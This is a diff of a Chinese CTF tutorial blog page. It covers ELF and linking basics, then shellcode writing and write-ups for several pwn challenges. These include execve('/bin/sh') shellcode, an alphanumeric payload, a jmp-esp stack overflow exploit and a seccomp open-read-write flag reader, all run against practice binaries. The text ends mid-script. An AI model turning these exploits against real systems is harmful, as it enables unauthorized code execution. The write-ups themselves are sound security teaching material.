@@ -358,11 +358,11 @@
             <!-- WordCount start -->
             <div class="blank_box"></div>
             <span class="meta">
-              Estimated Reading Time <span class="post-count">18</span> Minutes
+              Estimated Reading Time <span class="post-count">21</span> Minutes
             </span>
             <div class="blank_box"></div>
             <span class="meta">
-              Words <span class="post-count">4.4k</span> In Total
+              Words <span class="post-count">5.2k</span> In Total
             </span>
             <div class="blank_box"></div>
             <!-- WordCount end -->
@@ -418,54 +418,73 @@
       <!-- Post Container -->
       <div class="col-lg-8 col-lg-offset-1 col-md-10 col-md-offset-1 post-container">
 
-        <h1 id="二进制基础"><a href="#二进制基础" class="headerlink" title="二进制基础"></a>二进制基础</h1><h2 id="程序的编译与链接"><a href="#程序的编译与链接" class="headerlink" title="程序的编译与链接"></a>程序的编译与链接</h2><p><img src="https://blog-leo021017.oss-cn-beijing.aliyuncs.com/img/image-20231027192103669.png" alt="image-20231027192103669" style="zoom:33%;" /></p>
+        <h1>二进制基础</h1>
+<h2 id="程序的编译与链接">程序的编译与链接</h2>
+<img src="https://blog-leo021017.oss-cn-beijing.aliyuncs.com/img/image-20231027192103669.png" alt="image-20231027192103669" style="zoom:33%;" />
 <ol>
-<li><p><strong>预处理</strong>：预处理指令（如<code>#include</code>和<code>#define</code>）替换成实际的代码</p>
+<li>
+<p><strong>预处理</strong>：预处理指令（如<code>#include</code>和<code>#define</code>）替换成实际的代码</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">   gcc -E hello.c -o hello.i</span><br><span class="line"></span><br><span class="line">2. **编译**：由C语言代码生成汇编代码</span><br><span class="line"></span><br><span class="line">   ```bash</span><br><span class="line">   gcc -S hello.i -o hello.s</span><br></pre></td></tr></table></figure>
 </li>
-<li><p><strong>汇编</strong>：由汇编代码生成机器码（Windows下是<code>.obj</code>文件）</p>
+<li>
+<p><strong>汇编</strong>：由汇编代码生成机器码（Windows下是<code>.obj</code>文件）</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -c hello.s -o hello.o</span><br></pre></td></tr></table></figure>
 </li>
-<li><p><strong>链接</strong>：将多个机器码的目标文件链接成一个可执行文件</p>
+<li>
+<p><strong>链接</strong>：将多个机器码的目标文件链接成一个可执行文件</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc hello.o -o hello/hello.out</span><br></pre></td></tr></table></figure>
 </li>
 </ol>
-<h2 id="Linux下的可执行文件格式ELF"><a href="#Linux下的可执行文件格式ELF" class="headerlink" title="Linux下的可执行文件格式ELF"></a>Linux下的可执行文件格式ELF</h2><ul>
+<h2 id="Linux下的可执行文件格式ELF">Linux下的可执行文件格式ELF</h2>
+<ul>
 <li>可执行程序：.out</li>
 <li>可重定向文件：.o</li>
 <li>共享文件：动态链接库 .so / 静态链接库 .a</li>
 </ul>
 <p>详细结构如下：</p>
-<p><img src="https://blog-leo021017.oss-cn-beijing.aliyuncs.com/img/image-20231027194208160.png" alt="image-20231027194208160" style="zoom:30%;" /></p>
+<img src="https://blog-leo021017.oss-cn-beijing.aliyuncs.com/img/image-20231027194208160.png" alt="image-20231027194208160" style="zoom:30%;" />
 <ul>
-<li><p><strong>segment&amp;section</strong>: ELF文件格式提供了两种视图，分别是<strong>链接视图</strong>和<strong>执行视图</strong>；段是从运行的角度来描述ELF文件，以读写权限作为划分，而节是从链接的角度来描述elf文件，以程序功能作为划分</p>
+<li>
+<p><strong>segment&amp;section</strong>: ELF文件格式提供了两种视图，分别是<strong>链接视图</strong>和<strong>执行视图</strong>；段是从运行的角度来描述ELF文件，以读写权限作为划分，而节是从链接的角度来描述elf文件，以程序功能作为划分</p>
 </li>
-<li><p><strong>ELF_Header</strong>: 存放描述整个ELF文件组织的信息，如：版本信息，入口信息，偏移信息等</p>
+<li>
+<p><strong>ELF_Header</strong>: 存放描述整个ELF文件组织的信息，如：版本信息，入口信息，偏移信息等</p>
 </li>
-<li><strong>Program_Header_Table</strong>: 存放各个段的基本信息（包括地址指针），又叫做段表，告诉系统如何创建进程映像</li>
-<li><p><strong>Section_Header_Table</strong>： 类似于Program_Header_Table，但与其相对应的是节区，包含了文件各个section的属性信息</p>
+<li>
+<p><strong>Program_Header_Table</strong>: 存放各个段的基本信息（包括地址指针），又叫做段表，告诉系统如何创建进程映像</p>
 </li>
-<li><p><strong>section</strong>：每一种节根据功能不同分成不同的节，如<code>.tex</code>，<code>.plt</code>等</p>
+<li>
+<p><strong>Section_Header_Table</strong>： 类似于Program_Header_Table，但与其相对应的是节区，包含了文件各个section的属性信息</p>
 </li>
-<li>重定向文件必须有节头表，而其他文件不一定；可执行文件必须有段表，而其他文件不一定</li>
+<li>
+<p><strong>section</strong>：每一种节根据功能不同分成不同的节，如<code>.tex</code>，<code>.plt</code>等</p>
+</li>
+<li>
+<p>重定向文件必须有节头表，而其他文件不一定；可执行文件必须有段表，而其他文件不一定</p>
+</li>
 </ul>
 <p>当ELF文件从磁盘加载到内存成为进程时，不同的节会被分到段中（根据读写权限的不同，code段和data段），可以发现，只占到了很小的一部分；For Kernel是各个进程共享的内核空间（物理内存只有一份，各进程的自己的虚拟内存总复制多份）</p>
-<p><img src="https://blog-leo021017.oss-cn-beijing.aliyuncs.com/img/image-20231027200009634.png" alt="image-20231027200009634" style="zoom:40%;" /></p>
-<h2 id="进程虚拟地址空间"><a href="#进程虚拟地址空间" class="headerlink" title="进程虚拟地址空间"></a>进程虚拟地址空间</h2><p>64 bit的系统用户程序实际只用了一半的地址空间，剩下一半的地址空间分给了内核程序，所以64 bit地址空间非常充裕</p>
+<img src="https://blog-leo021017.oss-cn-beijing.aliyuncs.com/img/image-20231027200009634.png" alt="image-20231027200009634" style="zoom:40%;" />
+<h2 id="进程虚拟地址空间">进程虚拟地址空间</h2>
+<p>64 bit的系统用户程序实际只用了一半的地址空间，剩下一半的地址空间分给了内核程序，所以64 bit地址空间非常充裕</p>
 <p>而32 bit的地址空间就太少了</p>
-<p><img src="https://blog-leo021017.oss-cn-beijing.aliyuncs.com/img/image-20231031161606472.png" alt="image-20231031161606472" style="zoom:35%;" /></p>
+<img src="https://blog-leo021017.oss-cn-beijing.aliyuncs.com/img/image-20231031161606472.png" alt="image-20231031161606472" style="zoom:35%;" />
 <p>程序在内存中的具体组织方式如下：</p>
-<p><img src="https://blog-leo021017.oss-cn-beijing.aliyuncs.com/img/image-20231027202900176.png" alt="image-20231027202900176" style="zoom:33%;" /></p>
-<h2 id="程序的装载与进程的执行"><a href="#程序的装载与进程的执行" class="headerlink" title="程序的装载与进程的执行"></a>程序的装载与进程的执行</h2><p>为了避免相同的链接库被不同的进程都复制一份，浪费内存空间，于是提出了动态链接（分成加载时和运行时），将链接库代码复用，存着的是链接库的地址（偏移地址）</p>
+<img src="https://blog-leo021017.oss-cn-beijing.aliyuncs.com/img/image-20231027202900176.png" alt="image-20231027202900176" style="zoom:33%;" />
+<h2 id="程序的装载与进程的执行">程序的装载与进程的执行</h2>
+<p>为了避免相同的链接库被不同的进程都复制一份，浪费内存空间，于是提出了动态链接（分成加载时和运行时），将链接库代码复用，存着的是链接库的地址（偏移地址）</p>
 <ul>
-<li><p>静态链接：</p>
-<p><img src="https://blog-leo021017.oss-cn-beijing.aliyuncs.com/img/image-20231027205404510.png" alt="image-20231027205404510" style="zoom:30%;" /></p>
+<li>
+<p>静态链接：</p>
+<img src="https://blog-leo021017.oss-cn-beijing.aliyuncs.com/img/image-20231027205404510.png" alt="image-20231027205404510" style="zoom:30%;" />
 </li>
-<li><p>动态链接：</p>
-<p><img src="https://blog-leo021017.oss-cn-beijing.aliyuncs.com/img/image-20231027205430385.png" alt="image-20231027205430385" style="zoom:30%;" /></p>
+<li>
+<p>动态链接：</p>
+<img src="https://blog-leo021017.oss-cn-beijing.aliyuncs.com/img/image-20231027205430385.png" alt="image-20231027205430385" style="zoom:30%;" />
 </li>
 </ul>
-<h1 id="shellcode编写"><a href="#shellcode编写" class="headerlink" title="shellcode编写"></a>shellcode编写</h1><p>下面的code可以调用一个shell，但不能成为shellcode的原因如下：</p>
+<h1>shellcode编写</h1>
+<p>下面的code可以调用一个shell，但不能成为shellcode的原因如下：</p>
 <ul>
 <li>程序调用system函数之前先通过调用system的plt表找到system函数的具体位置，所以我们不知道system函数的具体位置，无法通过汇编指令直接跳转到system函数（或者其他系统调用）</li>
 <li>shellcode允许输入普遍较短，只有几十个字节，这段代码太大</li>
@@ -473,142 +492,236 @@
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc -m32 -o shell shell.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdlib.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;unistd.h&quot;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>所以使用“<strong>中断</strong>”的方法编写shellcode</p>
 <ul>
-<li><p>32位shellcode编写</p>
+<li>
+<p>32位shellcode编写</p>
 <ol>
-<li><p>设置ebx指向 /bin/sh</p>
+<li>
+<p>设置ebx指向 /bin/sh</p>
 </li>
-<li><p>ecx=0,edx=0</p>
+<li>
+<p>ecx=0,edx=0</p>
 </li>
-<li><p>eax=0xb（0xb是execv函数的调用号）</p>
+<li>
+<p>eax=0xb（0xb是execv函数的调用号）</p>
 </li>
-<li><p>Int 0x80触发中断调用</p>
+<li>
+<p>Int 0x80触发中断调用</p>
 </li>
 </ol>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">;;nasm -f elf32 i386.asm</span><br><span class="line">;;ld -m elf_i386 -o i386 i386.o</span><br><span class="line">;;objdump -d i386</span><br><span class="line">global _start</span><br><span class="line">_start:</span><br><span class="line">    push &quot;&#x2F;sh&quot;</span><br><span class="line">    push &quot;&#x2F;bin&quot;</span><br><span class="line">    mov ebx, esp;;ebx&#x3D;&quot;&#x2F;bin&#x2F;sh&quot;</span><br><span class="line">    xor edx, edx;;edx&#x3D;0</span><br><span class="line">    xor ecx, ecx;;ecx&#x3D;0</span><br><span class="line">    mov al, 0xb;;设置al&#x3D;0xb</span><br><span class="line">    int 0x80</span><br></pre></td></tr></table></figure>
 </li>
-<li><p>64位shellcode编写</p>
+<li>
+<p>64位shellcode编写</p>
 <ol>
-<li><p>设置rdi指向/bin/sh</p>
+<li>
+<p>设置rdi指向/bin/sh</p>
 </li>
-<li><p>rsi=0,rdx=0</p>
+<li>
+<p>rsi=0,rdx=0</p>
 </li>
-<li><p>rax=0x3b</p>
+<li>
+<p>rax=0x3b</p>
 </li>
-<li><p>syscall 进行系统调用</p>
+<li>
+<p>syscall 进行系统调用</p>
 </li>
 </ol>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">;;nasm -f elf64 x64.asm</span><br><span class="line">;;ld -m elf_x86_64 -o x64 x64.o</span><br><span class="line">;;objdump -d x64</span><br><span class="line">global _start</span><br><span class="line">_start:    </span><br><span class="line">    mov rbx, &#39;&#x2F;bin&#x2F;sh&#39;</span><br><span class="line">    push rbx</span><br><span class="line">    push rsp</span><br><span class="line">    pop rdi</span><br><span class="line">    xor esi, esi</span><br><span class="line">    xor edx, edx</span><br><span class="line">    push 0x3b</span><br><span class="line">    pop rax</span><br><span class="line">    syscall</span><br></pre></td></tr></table></figure>
 </li>
-<li><p>使用pwntools直接生成shellcode</p>
+<li>
+<p>使用pwntools直接生成shellcode</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#32位</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, arch = <span class="string">&#x27;i386&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line"><span class="comment">#64位</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, arch = ‘amd64<span class="string">&#x27;, os = &#x27;</span>linux<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">shellcode=asm(shellcraft.sh())</span></span><br></pre></td></tr></table></figure>
 <blockquote>
 <p><strong>例题 mrctf2020_shellcode</strong></p>
 <ol>
 <li>查看程序架构：<code>checksec mrctf2020_shellcode</code>，发现64位架构，开启了<code>Full RELRO</code>（RELRO 是 “Relocation Read-Only” 的缩写，指的是在程序加载时，将动态链接符号表中的重定位项设置为只读）；没有开启栈保护；存在一个可读可写可执行的栈</li>
 </ol>
-<p><img src="https://blog-leo021017.oss-cn-beijing.aliyuncs.com/img/image-20231028180743992.png" alt="image-20231028180743992" style="zoom:35%;" /></p>
-<ol>
-<li><p>使用IDA反汇编，发现read函数读入字符串，通过<code>call rax</code>执行注入的字符串</p>
-<p><img src="https://blog-leo021017.oss-cn-beijing.aliyuncs.com/img/image-20231028202035797.png" alt="image-20231028202035797" style="zoom:30%;" /></p>
+<img src="https://blog-leo021017.oss-cn-beijing.aliyuncs.com/img/image-20231028180743992.png" alt="image-20231028180743992" style="zoom:35%;" />
+<ol start="2">
+<li>
+<p>使用IDA反汇编，发现read函数读入字符串，通过<code>call rax</code>执行注入的字符串</p>
+<img src="https://blog-leo021017.oss-cn-beijing.aliyuncs.com/img/image-20231028202035797.png" alt="image-20231028202035797" style="zoom:30%;" />
 </li>
-<li><p>使用pwntools构造shellcode</p>
+<li>
+<p>使用pwntools构造shellcode</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>,arch = <span class="string">&#x27;amd64&#x27;</span>,terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;sp&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line">p =  process(<span class="string">&#x27;./mrctf2020_shellcode&#x27;</span>)</span><br><span class="line">shellcode1 = shellcraft.sh()</span><br><span class="line">payload1 = asm(shellcode1)</span><br><span class="line">p.send(payload1)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 <p>使用<code>gdb.attach(p)</code>可以在注入shellcode的过程中使用gdb调试</p>
-<p><img src="https://blog-leo021017.oss-cn-beijing.aliyuncs.com/img/image-20231028201845567.png" alt="image-20231028201845567" style="zoom:33%;" /></p>
+<img src="https://blog-leo021017.oss-cn-beijing.aliyuncs.com/img/image-20231028201845567.png" alt="image-20231028201845567" style="zoom:33%;" />
 </li>
 </ol>
+</blockquote>
+<blockquote>
 <p><strong>例题 mrctf2020_shellcode_revenge</strong></p>
-<p>参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/mcmuyanga/article/details/114828207">[BUUCTF]PWN——mrctf2020_shellcode_revenge（可见字符shellcode）</a></p>
+<p>参考[<a target="_blank" rel="noopener" href="https://blog.csdn.net/mcmuyanga/article/details/114828207">BUUCTF]PWN——mrctf2020_shellcode_revenge（可见字符shellcode）</a></p>
 <ol>
-<li><p>IDA反汇编，程序大概分成读入字符串，对字符串的字符进行判断，执行字符串三个部分</p>
+<li>
+<p>IDA反汇编，程序大概分成读入字符串，对字符串的字符进行判断，执行字符串三个部分</p>
 </li>
-<li><p>分析判断汇编语句，得到了以下的范围，在这个范围内程序会跳转执行<code>I Can&#39;t Read This!</code></p>
+<li>
+<p>分析判断汇编语句，得到了以下的范围，在这个范围内程序会跳转执行<code>I Can't Read This! </code></p>
 <p><img src="https://blog-leo021017.oss-cn-beijing.aliyuncs.com/img/image-20231029162308685.png" alt="image-20231029162308685"></p>
 </li>
-<li><p>查阅ASCII表，<code>(47,122]</code>的范围是0到z，就是可见字符shellcode，这里使用alpha3生成shellcode（注意alpha使用python2环境）</p>
+<li>
+<p>查阅ASCII表，<code>(47,122]</code>的范围是0到z，就是可见字符shellcode，这里使用alpha3生成shellcode（注意alpha使用python2环境）</p>
 </li>
-<li><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python ./ALPHA3.py x64 ascii mixedcase rax --input=&quot;存储shellcode的文件&quot; &gt; 输出文件</span></span><br><span class="line">from pwn import *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">f = open(<span class="string">&quot;sc.bin&quot;</span>, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">payload = asm(shellcraft.sh())</span><br><span class="line">f.write(payload)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>
+<li></li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python ./ALPHA3.py x64 ascii mixedcase rax --input=&quot;存储shellcode的文件&quot; &gt; 输出文件</span></span><br><span class="line">from pwn import *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">f = open(<span class="string">&quot;sc.bin&quot;</span>, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">payload = asm(shellcraft.sh())</span><br><span class="line">f.write(payload)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>
 <p><img src="https://blog-leo021017.oss-cn-beijing.aliyuncs.com/img/image-20231029165449094.png" alt="image-20231029165449094"></p>
-</li>
-<li><p>完整exp如下：</p>
+<ol start="5">
+<li>
+<p>完整exp如下：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./mrctf2020_shellcode_revenge&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="string">&#x27;29099&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&#x27;</span></span><br><span class="line">p.sendafter(<span class="string">&#x27;Show me your magic!\n&#x27;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 </li>
 </ol>
+</blockquote>
+<blockquote>
 <p><strong>例题 ciscn_2019_s_9</strong></p>
 <p>参考<a target="_blank" rel="noopener" href="https://vvmdx.github.io/2021/06/18/2021-06-18-CISCN_2019_s_9/index.html">CISCN_2019_s_9 | 无名大仙 (vvmdx.github.io)</a></p>
 <ol>
-<li><p>使用IDA反汇编，F5查看源码，main()函数只有调用pwn()函数的语句，pwn()函数内容如下</p>
-<p><img src="https://blog-leo021017.oss-cn-beijing.aliyuncs.com/img/image-20231028205906557.png" alt="image-20231028205906557" style="zoom:40%;" /></p>
+<li>
+<p>使用IDA反汇编，F5查看源码，main()函数只有调用pwn()函数的语句，pwn()函数内容如下</p>
+<img src="https://blog-leo021017.oss-cn-beijing.aliyuncs.com/img/image-20231028205906557.png" alt="image-20231028205906557" style="zoom:40%;" />
 </li>
-<li><p>这道题的执行逻辑中并没有直接调用我们输入的shellcode，那应该怎么办呢？经过观察发现程序存在一个hint()函数，写入了一句汇编代码<code>jmp  esp</code></p>
-<p><img src="https://blog-leo021017.oss-cn-beijing.aliyuncs.com/img/image-20231028210046873.png" alt="image-20231028210046873" style="zoom:40%;" /></p>
+<li>
+<p>这道题的执行逻辑中并没有直接调用我们输入的shellcode，那应该怎么办呢？经过观察发现程序存在一个hint()函数，写入了一句汇编代码<code>jmp  esp</code></p>
+<img src="https://blog-leo021017.oss-cn-beijing.aliyuncs.com/img/image-20231028210046873.png" alt="image-20231028210046873" style="zoom:40%;" />
 </li>
-<li><p>我们要做的就是覆盖pwn()函数的返回地址为<code>jmp esp</code>的地址，然后程序跳转到esp处的指令执行，我们将esp处的指令覆盖成一个<code>call</code>指令，就可以执行我们注入的指令</p>
+<li>
+<p>我们要做的就是覆盖pwn()函数的返回地址为<code>jmp esp</code>的地址，然后程序跳转到esp处的指令执行，我们将esp处的指令覆盖成一个<code>call</code>指令，就可以执行我们注入的指令</p>
 </li>
-<li><p><code>char s[24]</code>存放在[esp+8]或[ebp-20]的位置，所以函数栈帧大小是0x28，我们可以注入0x24个字符，观察ebp是否被覆盖，使用python构造<code>&#39;a&#39;*0x20+&#39;b&#39;*0x3</code>填入buf，发现成功覆盖到了ebp</p>
-<p><img src="https://blog-leo021017.oss-cn-beijing.aliyuncs.com/img/image-20231029140512149.png" alt="image-20231029140512149" style="zoom:50%;" /></p>
+<li>
+<p><code>char s[24]</code>存放在[esp+8]或[ebp-20]的位置，所以函数栈帧大小是0x28，我们可以注入0x24个字符，观察ebp是否被覆盖，使用python构造<code>'a'*0x20+'b'*0x3</code>填入buf，发现成功覆盖到了ebp</p>
+<img src="https://blog-leo021017.oss-cn-beijing.aliyuncs.com/img/image-20231029140512149.png" alt="image-20231029140512149" style="zoom:50%;" />
 </li>
-<li><p>我们将ebp上面的返回地址（假设0x20）覆盖层<code>jmp esp</code>的地址，此时esp会指向0x24（函数已经结束调用，栈帧和调用pwn函数前一致），在esp处写入<code>sub esp,40;call esp</code>开栈执行shellcode</p>
-<p><img src="https://blog-leo021017.oss-cn-beijing.aliyuncs.com/img/image-20231029143439987.png" alt="image-20231029143439987" style="zoom:35%;" /></p>
+<li>
+<p>我们将ebp上面的返回地址（假设0x20）覆盖层<code>jmp esp</code>的地址，此时esp会指向0x24（函数已经结束调用，栈帧和调用pwn函数前一致），在esp处写入<code>sub esp,40;call esp</code>开栈执行shellcode</p>
+<img src="https://blog-leo021017.oss-cn-beijing.aliyuncs.com/img/image-20231029143439987.png" alt="image-20231029143439987" style="zoom:35%;" />
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./ciscn_s_9&#x27;</span>)</span><br><span class="line"><span class="comment"># p = remote(&#x27;node4.buuoj.cn&#x27;,26098) </span></span><br><span class="line">shellcode =<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor    eax,eax</span></span><br><span class="line"><span class="string">xor    ecx,ecx</span></span><br><span class="line"><span class="string">xor    edx,edx</span></span><br><span class="line"><span class="string">push   0x0068732f   </span></span><br><span class="line"><span class="string">push   0x6e69622f   </span></span><br><span class="line"><span class="string">mov    ebx,esp</span></span><br><span class="line"><span class="string">mov    al,0xb</span></span><br><span class="line"><span class="string">int    0x80</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode = asm(shellcode)</span><br><span class="line">shell = <span class="string">&quot;sub esp, 0x28; call esp&quot;</span></span><br><span class="line">shell = asm(shell)</span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;\n&quot;</span>)</span><br><span class="line">payload = shellcode.ljust(<span class="number">0x24</span>,<span class="string">b&quot;\x90&quot;</span>)</span><br><span class="line">payload += p32(<span class="number">0x8048554</span>) <span class="comment">#jmp esp</span></span><br><span class="line">payload += shell</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 </li>
 </ol>
+</blockquote>
+<blockquote>
 <p><strong>例题 pwnable_orw</strong></p>
 <ol>
-<li><p>IDA反汇编，重点是<code>orw_secomp()</code>函数，是<strong>沙盒机制</strong></p>
-<p><img src="https://blog-leo021017.oss-cn-beijing.aliyuncs.com/img/image-20231029150126406.png" alt="image-20231029150126406" style="zoom:40%;" /></p>
+<li>
+<p>IDA反汇编，重点是<code>orw_secomp()</code>函数，是<strong>沙盒机制</strong></p>
+<img src="https://blog-leo021017.oss-cn-beijing.aliyuncs.com/img/image-20231029150126406.png" alt="image-20231029150126406" style="zoom:40%;" />
 </li>
-<li><p><strong>prctl seccomp</strong>相当于内核中的一种安全机制，正常情况下，程序可以使用所有的syscall，但是当劫持程序流程之后通过sys_exeve来呼叫syscall得到shell时，seccomp边排上了用场，他可以过滤掉某些syscall，只允许使用部分syscall<br>本题系统内核只允许使用sys_open，sys_read，sys_write</p>
+<li>
+<p><strong>prctl seccomp</strong>相当于内核中的一种安全机制，正常情况下，程序可以使用所有的syscall，但是当劫持程序流程之后通过sys_exeve来呼叫syscall得到shell时，seccomp边排上了用场，他可以过滤掉某些syscall，只允许使用部分syscall<br>
+本题系统内核只允许使用sys_open，sys_read，sys_write</p>
 </li>
-<li><p>这种题目的思路是：open打开flag，read读入flag，write输出flag</p>
+<li>
+<p>这种题目的思路是：open打开flag，read读入flag，write输出flag</p>
 <p>注意点：</p>
 <ol>
-<li><p>一般stdin,stdout,stderr已经被使用，使用open打开的fd一般等于3，所以read的fd应该为3，将flag的内容读入buf</p>
+<li>
+<p>一般stdin,stdout,stderr已经被使用，使用open打开的fd一般等于3，所以read的fd应该为3，将flag的内容读入buf</p>
 </li>
-<li><p>需要使用标准输出（fd=1），将读入buf的flag输出</p>
+<li>
+<p>需要使用标准输出（fd=1），将读入buf的flag输出</p>
 </li>
 </ol>
 </li>
-<li><p>对于buf位置的选取，一般选取可读可写的段，常见如<code>.bss</code>段（IDA shift+F5可查看）</p>
+<li>
+<p>对于buf位置的选取，一般选取可读可写的段，常见如<code>.bss</code>段（IDA shift+F5可查看）</p>
 </li>
-<li><p>exp如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28718</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;orw&#x27;</span>)</span><br><span class="line">                                       </span><br><span class="line">shellcode = shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>)</span><br><span class="line"><span class="comment"># shellcode += shellcraft.read(3,&#x27;esp&#x27;,100)</span></span><br><span class="line"><span class="comment"># shellcode += shellcraft.write(1,&#x27;esp&#x27;,100)</span></span><br><span class="line">shellcode += shellcraft.read(<span class="number">3</span>,<span class="number">0x0804A060</span>+<span class="number">0x100</span>,<span class="number">100</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>,<span class="number">0x0804A060</span>+<span class="number">0x100</span>,<span 